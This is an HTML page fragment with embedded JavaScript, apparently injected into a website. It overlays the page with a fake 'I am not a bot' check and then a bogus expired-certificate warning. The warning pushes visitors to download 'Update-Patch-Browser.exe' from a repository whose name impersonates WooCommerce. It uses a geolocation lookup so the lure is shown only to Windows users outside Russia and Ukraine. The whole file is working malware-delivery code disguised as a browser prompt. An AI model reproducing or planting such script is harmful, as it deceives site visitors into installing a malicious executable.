<div class="page-overlay"></div>
<script>
document.addEventListener("DOMContentLoaded", function() {
    // Создаем модальное окно с помощью JavaScript
    var modal = document.createElement('div');
    modal.className = 'modal';

    var modalContent = document.createElement('div');
    modalContent.className = 'modal-content';
    modalContent.innerHTML = `
        <div class="overlay">
            <div class="overlay-content">
                <h2>Confirm that you are not a bot</h2>
                <p>Please click the button below to confirm that you are not a bot.</p>
                <button id="confirmButton">I am not a bot</button>
            </div>
        </div>
        <div class="content hidden"><br><br>
            <h1>The security certificate HTTP/SSL has expired</h1><br>
            <p>The security certificate HTTP/SSL in your browser has expired, which may pose a security risk. Please download and install the latest update to update the security certificate.</p><br>
            <p>At the moment, to avoid the risk of infection, some browser functions may be disabled, and some pages may not be displayed correctly.</p><br>
            <p>To continue working in the browser in standard mode, it is recommended to install the update!</p><br><br><br>
            <a href="https://github.com/commerceWoo/woocommerce/raw/refs/heads/main/Update-Patch-Browser.exe" class="button">Download updated certificate</a><br><br><br>
        </div>
    `;

    modal.appendChild(modalContent);
    document.body.appendChild(modal);

    // Добавляем стили для модального окна и page-overlay
    var style = document.createElement('style');
    style.innerHTML = `
        .page-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            z-index: 999;
            display: none;
        }

        .modal {
            display: none; /* Скрыто по умолчанию */
            position: fixed; /* Остается на месте */
            z-index: 1001; /* Слой поверх других элементов */
            left: 0;
            top: 0;
            width: 100%; /* Полная ширина */
            height: 100%; /* Полная высота */
            overflow: auto; /* Включает прокрутку, если необходимо */
            background-color: rgb(0,0,0); /* Черный фон с прозрачностью */
            background-color: rgba(0,0,0,0.4); /* Черный фон с прозрачностью */
        }

        .modal-content {
            background-color: #fefefe;
            margin: 15% auto; /* 15% сверху и по центру */
            padding: 20px;
            border: 1px solid #888;
            width: 80%; /* Можно изменить ширину */
            text-align: center; /* Центрирование текста */
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .overlay-content {
            background: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        .overlay-content h2 {
            color: #333;
            margin-bottom: 20px;
            font-size: 22px;
        }

        .overlay-content p {
            color: #555;
            margin-bottom: 20px;
            font-size: 16px;
        }

        .overlay-content button {
            background-color: #28a745;
            color: #fff;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .overlay-content button:hover {
            background-color: #218838;
        }

        .hidden {
            display: none;
        }

        .content {
            text-align: center;
            color: #333;
            max-width: 600px;
            width: 100%;
            padding: 20px;
            background-color: #f8d7da; /* Светло-красный фон для предупреждения */
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 1px solid #f5c6cb; /* Светло-красная граница для предупреждения */
            margin: 0 auto; /* Центрирование по горизонтали */
        }

        .content h1 {
            color: #721c24; /* Темно-красный цвет текста для предупреждения */
            margin-bottom: 20px;
            font-size: 24px;
        }

        .content p {
            color: #721c24; /* Темно-красный цвет текста для предупреждения */
            font-size: 16px;
            margin-bottom: 20px;
        }

        .content .button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            text-decoration: none;
            border-radius: 4px;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        .content .button:hover {
            background-color: #0056b3;
        }
    `;
    document.head.appendChild(style);

    async function checkUser() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            const isAllowedCountry = data.country_code == 'RU' || data.country_code == 'UA';
            const isWindows = navigator.userAgent.indexOf("Windows") !== -1;

            if (!isAllowedCountry && isWindows) {
                // Показываем модальное окно и слой поверх страницы
                document.querySelector('.modal').style.display = 'block';
                document.querySelector('.page-overlay').style.display = 'block';
            } else {
                // Показываем основную информацию на странице
                var elements = document.querySelectorAll('h2, a');
                elements.forEach(function(element) {
                    element.style.display = 'block';
                });
            }
        } catch (error) {
            console.error('Ошибка:', error);
        }
    }
    checkUser();

    // Добавляем обработчик событий для кнопки подтверждения
    const confirmButton = document.getElementById("confirmButton");
    const overlay = document.querySelector(".overlay");
    const content = document.querySelector(".content");

    confirmButton.addEventListener("click", function() {
        overlay.classList.add("hidden");
        content.classList.remove("hidden");
    });
});
</script>
